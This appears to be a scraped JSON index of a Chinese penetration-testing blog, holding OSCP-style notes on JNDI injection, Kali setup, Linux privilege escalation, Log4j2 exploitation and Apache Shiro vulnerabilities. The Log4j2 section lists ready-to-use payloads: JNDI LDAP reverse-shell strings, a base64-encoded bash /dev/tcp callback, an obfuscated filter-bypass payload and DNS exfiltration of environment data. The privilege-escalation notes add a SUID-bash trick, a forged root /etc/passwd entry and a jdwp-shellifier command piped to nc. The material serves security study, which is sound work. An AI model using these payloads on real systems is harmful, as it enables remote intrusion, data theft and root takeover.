JNDI\u003c/h3\u003e\n\u003cp\u003eJava名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eInitialContext context = new InitialContext();\r\ncontext.lookup(\u0026#34;rmi://localhost:1099/HelloService\u0026#34;);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e具体流程如下：\u003c/p\u003e\n\u003cp\u003e1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； \u003c/p\u003e\n\u003cp\u003e2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； \u003c/p\u003e\n\u003cp\u003e3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； \u003c/p\u003e\n\u003cp\u003e4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； \u003c/p\u003e\n\u003cp\u003e5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；\u003c/p\u003e\n\u003cp\u003e另外一种解释：\u003c/p\u003e\n\u003cp\u003eJNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e一些版本注入的问题：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eRMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。\r\n使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）\r\n从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的\r\npayload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）\r\n从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击\r\n方式开始失效。（直接不信任rmi）\r\n从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻\r\n击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。\r\n（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））\r\nRMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。\r\nRMI客户端使用lookup方法理论上可以主动攻击RMI Registry\r\nRMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端\r\n来看一下这个路程\r\n（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化\r\n（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用\r\njrmp的payload（其实就是绕过了黑名单能发送数据的类）\r\n（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了\r\n舞台\r\n（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本\r\n地存在的链子命令执行，不需要像外部做加载。\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e高版本注入的解决办法：\u003c/strong\u003e\u003c/p\u003e","title":"Fastjson"},{"content":"python2 安装pip问题：\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py python2 -m pip install --upgrade setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple pip2 安装impacket:\npython2 -m pip install impacket==0.9.22 kali安装bloodhound sudo apt-get install neo4j sudo neo4j console 控制台默认账密：neo4j 配置好后，安装bloodhound sudo apt-get install bloodhound 输入修改后的密码 ps1脚本使用： Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all kali 使用impacket\u0026ndash;docker 安装docker apt-get install docker.io systemctl start docker 下载相关文件夹： 构建 Impacket 的镜像： docker build -t \u0026#34;impacket:latest\u0026#34; . 使用 Impacket 的镜像： docker run -it --rm \u0026#34;impacket:latest\u0026#34; 安装impacket\u0026ndash;推荐此方式 git clone https://github.com/CoreSecurity/impacket.git cd impacket/ python3 -m pip install . sudo python3 setup.py install No module named \u0026ldquo;Crypto\u0026rdquo; 解决方案： pip install pycryptodome openvpn over socsk5 socks-proxy 192.168.5.2 7890 /etc/samba/smb.conf 配置 注释：\nmap to guest = bad user\n[mane] comment = mane testing path = /home/kali/Desktop/smb writeable = yes guest ok = yes read only = no force user = root version `GLIBC_2.34\u0026rsquo; not found 两个办法：\nhttps://www.cnblogs.com/tolele/p/16534014.html 更换链接器： patchelf /home/kali/Desktop/pen-200/Linux/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 ./easy_heap 更换glibc搜索路径： patchelf --set-rpath /home/kali/Desktop/pen-200/Linux/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 ./easy_heap(注意路径和可执行文件（参数）要按自己的来修改) 查看版本： strings /lib/x86_64-linux-gnu/libc.so.6 |grep GLIBC_ https://blog.csdn.net/weixin_65527369/article/details/127973141 gcc -Wl,-rpath=\u0026#39;/home/kali/Desktop/pen-200/Linux/glibc-all-in-one/libs/2.27-3ubuntu1_amd64\u0026#39;,-dynamic-linker=\u0026#39;/home/kali/Desktop/pen-200/Linux/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2\u0026#39; -s rootshell.c -o rootshell4 二是升级目标主机的libc6\nsudo apt update sudo apt install libc6 ","permalink":"https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/","summary":"\u003cp\u003epython2 安装pip问题：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://bootstrap.pypa.io/pip/2.7/get-pip.py\npython2 get-pip.py\npython2 -m pip install --upgrade setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003epip2 安装impacket:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epython2 -m pip install impacket==0.9.22\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"kali安装bloodhound\"\u003ekali安装bloodhound\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo apt-get install neo4j\nsudo neo4j console\n控制台默认账密：neo4j\n配置好后，安装bloodhound\nsudo apt-get install bloodhound\n输入修改后的密码\n\nps1脚本使用：\nImport-Module ./SharpHound.ps1; Invoke-BloodHound -c all\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"kali-使用impacket--docker\"\u003ekali 使用impacket\u0026ndash;docker\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e安装docker\napt-get install docker.io\nsystemctl start docker\n\n下载相关文件夹：\n构建 Impacket 的镜像：\ndocker build -t \u0026#34;impacket:latest\u0026#34; .\n使用 Impacket 的镜像：\ndocker run -it --rm \u0026#34;impacket:latest\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"安装impacket--推荐此方式\"\u003e安装impacket\u0026ndash;推荐此方式\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egit clone https://github.com/CoreSecurity/impacket.git \ncd impacket/ \npython3 -m pip install . \nsudo python3 setup.py install\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"no-module-named-crypto\"\u003eNo module named \u0026ldquo;Crypto\u0026rdquo;\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e解决方案：\npip install pycryptodome\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"openvpn-over-socsk5\"\u003eopenvpn over socsk5\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esocks-proxy 192.168.5.2 7890\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"etcsambasmbconf-配置\"\u003e/etc/samba/smb.conf 配置\u003c/h1\u003e\n\u003cp\u003e注释：\u003c/p\u003e","title":"kali 环境爬坑"},{"content":"添加路由： sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254 sudo route add -net \u0026lt;目标网络\u0026gt; netmask \u0026lt;掩码\u0026gt; gw \u0026lt;网关地址\u0026gt;\n有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；\nchmod u+s /bin/bash /bin/bash -p 提权手动，千万注意细节，文件、计划任务特殊、进程 1、SUID：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null 类似效果 /usr/sbin/getcap -r / 2\u0026gt;/dev/null 2、交互式shell:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 3、/etc/crontab ！！！ 手动检查\nls -lah /etc/cron*\n重点看小时和cron.d\n4、sudo -l\n5、数据库账密信息\n6、家目录文件\n7、文件可写：\n/etc/passwd /etc/shadow /etc/sudoers 8、内核信息：\nuname -a ##打印所有可用的系统信息 uname -r ##内核版本 uname -n ##系统主机名。 uname -m ##查看系统内核架构（64位/32位） hostname ##系统主机名 cat /proc/version ##内核信息 cat /etc/*-release ##分发信息 cat /etc/issue ##分发信息 cat /proc/cpuinfo ##CPU信息 cat /etc/lsb-release ##Debian cat /etc/redhat-release ##Redhat ls /boot | grep vmlinuz- 常用方法： 1、确认内核版本： cat /etc/issue 发行版 uname -r 内核 arch 架构 2、筛选： searchsploit \u0026#34;linux kernel Ubuntu 16 Local Privilege Escalation\u0026#34; | grep \u0026#34;4.\u0026#34; | grep -v \u0026#34; \u0026lt; 4.4.0\u0026#34; | grep -v \u0026#34;4.8\u0026#34; 9、.bashrc\nenv cat .bashrc 10、进程监控\nwatch -n 1 \u0026#34;ps -aux | grep pass\u0026#34; sudo tcpdump -i lo -A | grep \u0026#34;pass\u0026#34; 11、系统日志查计划任务\ngrep \u0026#34;CRON\u0026#34; /var/log/syslog 12、备份文件\n特别是一些目录下的：var、opt、tmp\n13、端口，不对外开放的那种\n目前可能存在web高权限、java调试应用等\n14、当前权限用户家目录\n常用技巧 查找doas相关的文件：\nfind / -name *local.txt* -type f 2\u0026gt;/dev/null 查找内容中带有pass的文件：\ngrep -R -i pass /home/* 2\u0026gt;/dev/null 查找某个用户的文件：\nfind / -type f -user delx 2\u0026gt;/dev/null 查看程序内容：\nstrings xxx 生成passwd密码：\nopenssl passwd -1 $1$8PxO.i7T$aDaohw/CLzjdaIOK8BrDy1 root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash #Abcd1234 辅助脚本\nhttps://pentestmonkey.net/tools/audit/unix-privesc-check https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 2021-4034 带有polkit可尝试\nhttps://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2 DirtyPipe https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c jdwp-shellifier java 提权 proxychains4 python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on \u0026#39;java.lang.String.indexOf\u0026#39; -c \u0026#39;chmod u+s /bin/bash nc 192.168.224.150 5000 ","permalink":"https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/","summary":"\u003cp\u003e添加路由：\nsudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254\nsudo route add -net \u0026lt;目标网络\u0026gt; netmask \u0026lt;掩码\u0026gt; gw \u0026lt;网关地址\u0026gt;\u003c/p\u003e\n\u003cp\u003e有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003echmod u+s /bin/bash\n/bin/bash -p \n\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"提权手动千万注意细节文件计划任务特殊进程\"\u003e提权手动，千万注意细节，文件、计划任务特殊、进程\u003c/h1\u003e\n\u003cp\u003e1、SUID：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efind / -perm -u=s -type f 2\u0026gt;/dev/null\n类似效果\n/usr/sbin/getcap -r / 2\u0026gt;/dev/null\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e2、交互式shell:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e3、/etc/crontab ！！！ 手动检查\u003c/p\u003e\n\u003cp\u003els -lah /etc/cron*\u003c/p\u003e\n\u003cp\u003e重点看\u003cstrong\u003e小时\u003c/strong\u003e和\u003cstrong\u003ecron.d\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e4、sudo -l\u003c/p\u003e\n\u003cp\u003e5、数据库账密信息\u003c/p\u003e\n\u003cp\u003e6、家目录文件\u003c/p\u003e\n\u003cp\u003e7、文件可写：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/etc/passwd\n/etc/shadow\n/etc/sudoers\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e8、内核信息：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003euname -a    ##打印所有可用的系统信息\nuname -r    ##内核版本\nuname -n    ##系统主机名。\nuname -m    ##查看系统内核架构（64位/32位）\nhostname    ##系统主机名\ncat /proc/version    ##内核信息\ncat /etc/*-release   ##分发信息\ncat /etc/issue       ##分发信息\ncat /proc/cpuinfo    ##CPU信息\ncat /etc/lsb-release   ##Debian \ncat /etc/redhat-release  ##Redhat\nls /boot | grep vmlinuz-\n\n\n常用方法：\n1、确认内核版本：\ncat /etc/issue 发行版\nuname -r 内核\narch 架构\n\n2、筛选：\nsearchsploit \u0026#34;linux kernel Ubuntu 16 Local Privilege Escalation\u0026#34;   | grep  \u0026#34;4.\u0026#34; | grep -v \u0026#34; \u0026lt; 4.4.0\u0026#34; | grep -v \u0026#34;4.8\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e9、.bashrc\u003c/p\u003e","title":"Linux 提权"},{"content":"一、Log4j2 Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。\n​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。\n二、漏洞原理 由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施 导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。\n来看一下正常使用的代码：\nimport org.apache.logging.log4j.LogManager;\rimport org.apache.logging.log4j.Logger;\rpublic class Log4j2Test {\rprivate static final Logger logger = LogManager.getLogger();\rpublic static void main(String[] args) {\rString username = \u0026#34;world\u0026#34;;\rlogger.error(\u0026#34;hello {}\u0026#34;,username);\r} 正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：\nMessagePatternConverter.format()会对${进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable() StrSubstitutor.resolveVariable()调用lookup方法 判断识别jndi的处理类JndiLookup JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context 并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索\n到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。\n三、漏洞发现 由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测\n影响范围：Apache Log4j 2.x\u0026lt;=2.14.1\n四、漏洞利用 开启log4j2的JNDI注入工具：\njava -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40 值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址\n发送恶意payload:\n基础payload:\n${jndi:ldap://dadad.ceye.io} 反弹shell：\n${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888} 实战中有失败案例\r${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx} 使用较多 另外一个工具的使用方式：\n坑点：空格少一个，多一个可能导致运行失败\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;bash -c {echo,Base64编码后的Payload}|{base64,-d}|{bash,-i}\u0026#34; -A \u0026#34;攻击机IP\u0026#34;\rjava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; -A \u0026#34;192.168.2.40\u0026#34; payload:\n工具运行会显示：\n绕过payload示例：\n${${::-j}${::-n}${::-d}${::-i}:ldap://120.24.183.94:1389/Basic/ReverseShell/120.24.183.94/65510} TIPS:\n可能遇到URL编码问题，可观察命令情况以及URL编解码解决\n带出方法：\n${jndi:ldap://${java:version}.u2xf5m.dnslog.cn} DNS带出：\n使用\nlogg.error(\u0026#34;${jndi:dns://xxxxx:8090/${java:version}}\u0026#34;); 在自己的VPS上nc -luvvp 8090即可收到信息\n在自己的VPS上nc -luvvp 8090即可收到信息\n其他命令：\nlog4j-java\nID\tusage\tmethod\r1\t${java:version}\tgetSystemProperty(\u0026#34;java.version\u0026#34;)\r2\t${java:runtime}\tgetRuntime()\r3\t${java:vm}\tgetVirtualMachine()\r4\t${java:os}\tgetOperatingSystem()\r5\t${java:hw}\tgetHardware()\r6\t${java:locale}\tgetLocale() Linux\nid\tusage\r1\t${env:CLASSPATH}\r2\t${env:HOME}\r3\t${env:JAVA_HOME}\r4\t${env:LANG}\r5\t${env:LOGNAME}\r6\t${env:MAIL}\r7\t${env:PATH}\r8\t${env:PWD}\r9\t${env:SHELL}\r10\t${env:USER} Windows\nid\tusage\r1\t${env:A8_HOME}\r2\t${env:A8_ROOT_BIN}\r3\t${env:CLASSPATH}\r4\t${env:JRE_HOME}\r5\t${env:Java_Home}\r6\t${env:LOGONSERVER}\r7\t${env:OS}\r8\t${env:Path}\r9\t${env:USERDOMAIN}\r10\t${env:USERNAME} log4j2-sys\nid\tusage\r1\t${sys:java.version}\r2\t${sys:os.name}\r3\t${sys:os.version}\r4\t${sys:user.name} 五、内存马注入 大致方式和fastjson jndi注入一致：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \u0026#34;http://192.168.5.106:8888/#a\u0026#34; 9999 ${jndi:rmi://192.168.5.106:9999/b} 受限于JDK版本和组件，注入方法可能不太一样，其他集成工具有待验证。\n","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/","summary":"\u003ch1 id=\"一log4j2\"\u003e一、Log4j2\u003c/h1\u003e\n\u003cp\u003eLog4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。\u003c/p\u003e\n\u003cp\u003e​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。\u003c/p\u003e\n\u003ch1 id=\"二漏洞原理\"\u003e二、漏洞原理\u003c/h1\u003e\n\u003cp\u003e由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施\n导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。\u003c/p\u003e\n\u003cp\u003e来看一下正常使用的代码：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport org.apache.logging.log4j.LogManager;\r\nimport org.apache.logging.log4j.Logger;\r\n \r\npublic class Log4j2Test {\r\n    private static  final Logger logger = LogManager.getLogger();\r\n    public static void main(String[] args) {\r\n        String username = \u0026#34;world\u0026#34;;\r\n        logger.error(\u0026#34;hello {}\u0026#34;,username);\r\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：\u003c/p\u003e\n\u003cp\u003eMessagePatternConverter.format()会对\u003ccode\u003e${\u003c/code\u003e进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable()\nStrSubstitutor.resolveVariable()调用lookup方法\n判断识别jndi的处理类JndiLookup\nJndiLookup.lookup()调用JndiManager.getDefaultManager()获得context\n并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索\u003c/p\u003e\n\u003cp\u003e到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。\u003c/p\u003e\n\u003ch1 id=\"三漏洞发现\"\u003e三、漏洞发现\u003c/h1\u003e\n\u003cp\u003e由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测\u003c/p\u003e\n\u003cp\u003e影响范围：Apache Log4j 2.x\u0026lt;=2.14.1\u003c/p\u003e\n\u003ch1 id=\"四漏洞利用\"\u003e四、漏洞利用\u003c/h1\u003e\n\u003cp\u003e开启log4j2的JNDI注入工具：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejava -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发送恶意payload:\u003c/p\u003e\n\u003cp\u003e基础payload:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e${jndi:ldap://dadad.ceye.io}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e反弹shell：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888}  实战中有失败案例\r\n${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx}  使用较多\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e另外一个工具的使用方式：\u003c/strong\u003e\u003c/p\u003e","title":"Log4j2"},{"content":"一、shiro Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。\nShiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；\n二、漏洞原理 CVE-2016-4437/Shiro-550 Shiro \u0026lt; 1.2.5\n第1个注意的事项：要在response中返回含有remenberMe的字段对应的请求中去构造poc\n第2个注意的事项 ：获取cookies的请求包resquest的必须是登录提交的http请求\n（1）shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：\nCookie中rememberMe字段内容\n---\u0026gt; Base64解码 ---\u0026gt; 使用密钥进行AES-CBC解密 ---\u0026gt; 反序列化\r（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。\n官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。\n密钥保存位置：\n最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。\nCVE-2019-12422/Shiro-721 Shiro \u0026lt; 1.4.2\n在Apache Shiro 中用户进行登录的时候, 提供RemenberMe功能处理cookie，使用的是AES-128-CBC加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，可进行反序列化攻击。\n跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐Padding Oracle Attack(填充提示攻击)详解及验证。\n简单来说，Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。解密出的明文填充的正确与否可通过服务端的响应进行区分。通过不断调整发送的密文分组，然后根据服务端的结果进行爆破测试，可推测出确定的解密值。当应用程序接受到加密后的值以后，可能有以下三种返回：\n1、接受到正确的密文之后（填充正确且包含正确的值），应用程序正常返回：200 OK。\n2、接受到合法的密文（填充正确，但解密后得到一个不正确的值），应用程序显示自定义错误消息：200 OK。\n3、接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常：500 Internal Server Error。\n我们不需要要求解密后必须是正确的值，只要返回200 ok即可。\naes gcm加密方式不一样的\nCVE-2020-1957/认证绕过漏洞 Shiro \u0026lt; 1.5.2\nspring Boot中使用Apache Shiro进行身份验证、权限控制时，可以精心构造恶意的URL，利用Apache Shiro和Spring Boot对URL的处理的差异化，可以绕过Apache Shiro对Spring Boot中的Servlet的权限控制，越权并实现未授权访问。\n漏洞发生的跟本原因是shiro对于URL的处理和spring Boot的处理逻辑存在偏差，当URL进入服务器后，处理顺序为先经过shiro后经过spring Boot\n首先，/admin是需要鉴权才可以访问的路径。\n我们发送的恶意/xxxxx/..;/admin请求首先经过Shiro进行处理，在shiro中经过处理变为/xxxxx/..\n替换反斜线\r替换 // 为 /\r替换 /./ 为 /\r替换 /../ 为 / 随后传入spring Boot，经过JDK解析从Mapping中得到Servlet结果为/admin，导致了未授权访问。\nhttp://192.168.5.105:8080/xxx/..;/admin/\n三、漏洞利用 梭哈、内存马注入和key修改基本上都已经集成了，没有操作难度。\n四、其他 面试常问shiro rememberMe的字段超过header头限制该怎么解决，目前的解决方案：\n1、通过类动态加载机制，使用post方法提交数据，加载post体中的字节码。包括目前主流的工具基本上都是这么做的。\n2、通过动态修改tomcat maxHttpHeaderSize属性的值\n3、Gzip+Base64压缩编码类字节码：将Payload的一部分添加到ClassLoader的classes字段\n","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/","summary":"\u003ch1 id=\"一shiro\"\u003e一、shiro\u003c/h1\u003e\n\u003cp\u003eApache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。\u003c/p\u003e\n\u003cp\u003eShiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；\u003c/p\u003e\n\u003ch1 id=\"二漏洞原理\"\u003e二、漏洞原理\u003c/h1\u003e\n\u003ch3 id=\"cve-2016-4437shiro-550\"\u003eCVE-2016-4437/Shiro-550\u003c/h3\u003e\n\u003cp\u003eShiro \u0026lt; 1.2.5\u003c/p\u003e\n\u003cp\u003e第1个注意的事项：要在response中返回含有remenberMe的字段对应的请求中去构造poc\u003c/p\u003e\n\u003cp\u003e第2个注意的事项 ：获取cookies的请求包resquest的必须是登录提交的http请求\u003c/p\u003e\n\u003cp\u003e（1）shiro在登录处提供了Remember 